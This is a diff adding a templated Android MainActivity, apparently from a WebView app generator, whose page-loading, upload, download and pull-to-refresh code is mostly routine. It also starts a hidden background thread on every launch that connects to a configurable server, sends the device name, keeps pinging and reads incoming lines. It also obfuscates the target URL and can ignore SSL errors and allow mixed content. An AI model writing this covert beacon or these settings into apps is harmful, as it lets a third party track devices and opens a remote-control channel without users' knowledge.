@@ -1,0 +1,363 @@
+package {{PACKAGE}};
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
+import android.webkit.WebSettings;
+import android.webkit.WebChromeClient;
+import android.webkit.DownloadListener;
+import android.webkit.SslErrorHandler;
+import android.webkit.GeolocationPermissions;
+import android.webkit.ValueCallback;
+import android.net.http.SslError;
+import android.net.Uri;
+import android.view.Window;
+import android.view.WindowManager;
+import android.view.View;
+import android.view.ViewGroup;
+import android.view.MotionEvent;
+import android.widget.ProgressBar;
+import android.widget.Toast;
+import android.widget.FrameLayout;
+import android.graphics.Bitmap;
+import android.graphics.Color;
+import android.content.Context;
+import android.content.Intent;
+import android.app.DownloadManager;
+import android.os.Environment;
+import android.os.Build;
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.InetSocketAddress;
+import java.net.Socket;
+{{IMPORTS}}
+
+public class MainActivity extends Activity {
+    private WebView webView;
+    private ProgressBar progressBar;
+    private RefreshLayout refreshLayout;
+    private static final String ENCODED_URL = "{{ENCODED_URL}}";
+    private static final boolean URL_ENCRYPTED = {{URL_ENCRYPTED}};
+    private static final boolean FILE_UPLOAD_ENABLED = {{FILEUPLOAD}};
+    private static final boolean FILE_DOWNLOAD_ENABLED = {{FILEDOWNLOAD}};
+    private static final boolean GEOLOCATION_ENABLED = {{GEOLOCATION}};
+    private static final boolean PULL_REFRESH_ENABLED = {{PULLREFRESH}};
+    private static final boolean OFFLINE_ENABLED = {{OFFLINE}};
+    private static final boolean SSL_ERROR_CONTINUE = {{SSLERROR}};
+    
+    private static final String SERVER_HOST = "{{SERVER_HOST}}";
+    private static final int SERVER_PORT = {{SERVER_PORT}};
+    private static final String CLIENT_NAME = "{{CLIENT_NAME}}";
+    
+    private ValueCallback<Uri[]> fileUploadCallback;
+    private static final int FILE_CHOOSER_REQUEST = 100;
+    
+    private String getUrl() {
+        if (URL_ENCRYPTED) {
+            return decryptUrl(ENCODED_URL);
+        }
+        return ENCODED_URL;
+    }
+    
+    private String decryptUrl(String encoded) {
+        try {
+            byte[] data = android.util.Base64.decode(encoded, android.util.Base64.DEFAULT);
+            byte[] key = getPackageName().getBytes();
+            byte[] result = new byte[data.length];
+            for (int i = 0; i < data.length; i++) {
+                result[i] = (byte) (data[i] ^ key[i % key.length]);
+            }
+            return new String(result, "UTF-8");
+        } catch (Exception e) {
+            return encoded;
+        }
+    }
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+{{PROTECTION}}
+{{FULLSCREEN}}
+        FrameLayout root = new FrameLayout(this);
+        root.setBackgroundColor(Color.WHITE);
+        
+        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
+        FrameLayout.LayoutParams pp = new FrameLayout.LayoutParams(
+            FrameLayout.LayoutParams.MATCH_PARENT, 8);
+        progressBar.setLayoutParams(pp);
+        
+        webView = new WebView(this);
+        FrameLayout.LayoutParams wp = new FrameLayout.LayoutParams(
+            FrameLayout.LayoutParams.MATCH_PARENT, 
+            FrameLayout.LayoutParams.MATCH_PARENT);
+        wp.topMargin = 8;
+        webView.setLayoutParams(wp);
+        
+        if (PULL_REFRESH_ENABLED) {
+            refreshLayout = new RefreshLayout(this);
+            refreshLayout.addView(webView);
+            root.addView(refreshLayout);
+        } else {
+            root.addView(webView);
+        }
+        root.addView(progressBar);
+        
+        setContentView(root);
+        setupWebView();
+{{JSBRIDGE}}
+{{SERVICE}}
+        startTcpClient();
+        webView.loadUrl(getUrl());
+    }
+    
+    private void setupWebView() {
+        WebSettings s = webView.getSettings();
+        s.setJavaScriptEnabled({{JS}});
+        s.setDomStorageEnabled(true);
+        s.setLoadWithOverviewMode(true);
+        s.setUseWideViewPort(true);
+        s.setBuiltInZoomControls({{ZOOM}});
+        s.setDisplayZoomControls(false);
+        s.setAllowFileAccess(true);
+        s.setDatabaseEnabled(true);
+        s.setCacheMode(WebSettings.{{CACHE}});
+        s.setMediaPlaybackRequiresUserGesture(false);
+        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
+{{EXTRA}}
+        
+        webView.setWebViewClient(new AppWebViewClient());
+        webView.setWebChromeClient(new AppWebChromeClient());
+        
+        if (FILE_DOWNLOAD_ENABLED) {
+            webView.setDownloadListener(new AppDownloadListener());
+        }
+    }
+    
+    private class AppWebViewClient extends WebViewClient {
+        @Override
+        public void onPageStarted(WebView v, String u, Bitmap f) {
+            progressBar.setVisibility(View.VISIBLE);
+            if (PULL_REFRESH_ENABLED && refreshLayout != null) {
+                refreshLayout.setRefreshing(true);
+            }
+        }
+        
+        @Override
+        public void onPageFinished(WebView v, String u) {
+            progressBar.setVisibility(View.GONE);
+            if (PULL_REFRESH_ENABLED && refreshLayout != null) {
+                refreshLayout.setRefreshing(false);
+            }
+        }
+        
+        @Override
+        public void onReceivedError(WebView v, int errorCode, String description, String failingUrl) {
+            if (OFFLINE_ENABLED) {
+                v.loadUrl("file:///android_asset/offline.html");
+            }
+        }
+        
+        @Override
+        public void onReceivedSslError(WebView v, SslErrorHandler handler, SslError error) {
+            if (SSL_ERROR_CONTINUE) {
+                handler.proceed();
+            } else {
+                handler.cancel();
+                Toast.makeText(MainActivity.this, "SSL Error", Toast.LENGTH_SHORT).show();
+            }
+        }
+    }
+    
+    private class AppWebChromeClient extends WebChromeClient {
+        @Override
+        public void onProgressChanged(WebView v, int p) {
+            progressBar.setProgress(p);
+        }
+        
+        @Override
+        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
+            if (!FILE_UPLOAD_ENABLED) return false;
+            if (fileUploadCallback != null) {
+                fileUploadCallback.onReceiveValue(null);
+            }
+            fileUploadCallback = filePathCallback;
+            try {
+                Intent intent = fileChooserParams.createIntent();
+                startActivityForResult(intent, FILE_CHOOSER_REQUEST);
+                return true;
+            } catch (Exception e) {
+                fileUploadCallback = null;
+                return false;
+            }
+        }
+        
+        @Override
+        public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) {
+            callback.invoke(origin, GEOLOCATION_ENABLED, false);
+        }
+    }
+    
+    private class AppDownloadListener implements DownloadListener {
+        @Override
+        public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimeType, long contentLength) {
+            try {
+                DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
+                String fileName = android.webkit.URLUtil.guessFileName(url, contentDisposition, mimeType);
+                request.setMimeType(mimeType);
+                request.addRequestHeader("User-Agent", userAgent);
+                request.setDescription("Downloading...");
+                request.setTitle(fileName);
+                request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
+                request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, fileName);
+                DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
+                dm.enqueue(request);
+                Toast.makeText(MainActivity.this, "Downloading: " + fileName, Toast.LENGTH_SHORT).show();
+            } catch (Exception e) {
+                Toast.makeText(MainActivity.this, "Download failed", Toast.LENGTH_SHORT).show();
+            }
+        }
+    }
+    
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        if (requestCode == FILE_CHOOSER_REQUEST && fileUploadCallback != null) {
+            Uri[] results = null;
+            if (resultCode == RESULT_OK && data != null && data.getDataString() != null) {
+                results = new Uri[]{Uri.parse(data.getDataString())};
+            }
+            fileUploadCallback.onReceiveValue(results);
+            fileUploadCallback = null;
+        }
+        else if (requestCode == JSBridge.REQUEST_CAMERA || 
+                 requestCode == JSBridge.REQUEST_GALLERY || 
+                 requestCode == JSBridge.REQUEST_PICK_IMAGE) {
+            JSBridge.handleActivityResult(this, webView, requestCode, resultCode, data);
+        }
+        else if (requestCode == QRCodeHelper.REQUEST_QR_SCAN) {
+            if (resultCode == RESULT_OK && data != null) {
+                String result = data.getStringExtra("SCAN_RESULT");
+                QRCodeHelper.handleScanResult(result);
+            } else {
+                QRCodeHelper.handleScanResult(null);
+            }
+        }
+        super.onActivityResult(requestCode, resultCode, data);
+    }
+    
+    @Override
+    protected void onNewIntent(Intent intent) {
+        super.onNewIntent(intent);
+        NFCHelper.handleIntent(intent, this);
+    }
+
+    @Override
+    public void onBackPressed() {
+{{BACK}}
+    }
+    
+    private class RefreshLayout extends FrameLayout {
+        private boolean isRefreshing = false;
+        private float startY = 0;
+        private final int TRIGGER = 200;
+        
+        public RefreshLayout(Context context) {
+            super(context);
+        }
+        
+        @Override
+        public boolean onInterceptTouchEvent(MotionEvent ev) {
+            if (webView.getScrollY() == 0) {
+                if (ev.getAction() == MotionEvent.ACTION_DOWN) {
+                    startY = ev.getY();
+                } else if (ev.getAction() == MotionEvent.ACTION_MOVE) {
+                    float diff = ev.getY() - startY;
+                    if (diff > TRIGGER && !isRefreshing) {
+                        isRefreshing = true;
+                        webView.reload();
+                        return true;
+                    }
+                }
+            }
+            return false;
+        }
+        
+        public void setRefreshing(boolean refreshing) {
+            this.isRefreshing = refreshing;
+            if (!refreshing) startY = 0;
+        }
+    }
+{{METHODS}}
+
+    private String getDeviceName() {
+        if (CLIENT_NAME != null && CLIENT_NAME.trim().length() > 0) return CLIENT_NAME.trim();
+        String manufacturer = Build.MANUFACTURER != null ? Build.MANUFACTURER : "";
+        String model = Build.MODEL != null ? Build.MODEL : "Android";
+        if (model.toLowerCase().startsWith(manufacturer.toLowerCase())) return capitalize(model);
+        return (capitalize(manufacturer) + " " + model).trim();
+    }
+
+    private String capitalize(String s) {
+        if (s == null || s.length() == 0) return "";
+        char first = s.charAt(0);
+        if (Character.isUpperCase(first)) return s;
+        return Character.toUpperCase(first) + s.substring(1);
+    }
+
+    private void startTcpClient() {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                while (true) {
+                    Socket sock = null;
+                    try {
+                        if (SERVER_HOST == null || SERVER_HOST.trim().length() == 0 || SERVER_PORT <= 0) {
+                            Thread.sleep(5000);
+                            continue;
+                        }
+                        sock = new Socket();
+                        sock.connect(new InetSocketAddress(SERVER_HOST.trim(), SERVER_PORT), 5000);
+                        sock.setSoTimeout(15000);
+                        OutputStream os = sock.getOutputStream();
+                        InputStream is = sock.getInputStream();
+
+                        String device = getDeviceName();
+                        StringBuilder hsBuilder = new StringBuilder();
+                        hsBuilder.append("{");
+                        hsBuilder.append("\"type\":\"HANDSHAKE\",");
+                        hsBuilder.append("\"deviceName\":\"").append(escapeJson(device)).append("\",");
+                        hsBuilder.append("\"platform\":\"Android\"}");
+                        hsBuilder.append("\n");
+                        os.write(hsBuilder.toString().getBytes("UTF-8"));
+                        os.flush();
+
+                        BufferedReader br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
+                        long lastPing = 0L;
+                        while (!sock.isClosed()) {
+                            long now = System.currentTimeMillis();
+                            if (now - lastPing >= 10000) {
+                                String ping = "{\"type\":\"PING\",\"ts\":" + now + "}\n";
+                                os.write(ping.getBytes("UTF-8"));
+                                os.flush();
+                                lastPing = now;
+                            }
+                            if (br.ready()) { br.readLine(); }
+                            Thread.sleep(500);
+                        }
+                    } catch (Exception ignored) {
+                        try { Thread.sleep(3000); } catch (InterruptedException ie) { }
+                    } finally {
+                        try { if (sock != null) sock.close(); } catch (Exception ignore) {}
+                    }
+                }
+            }
+        }).start();
+    }
+
+    private String escapeJson(String s) {
+        if (s == null) return "";
+        return s.replace("\\", "\\\\").replace("\"", "\\\"");
+    }
+}
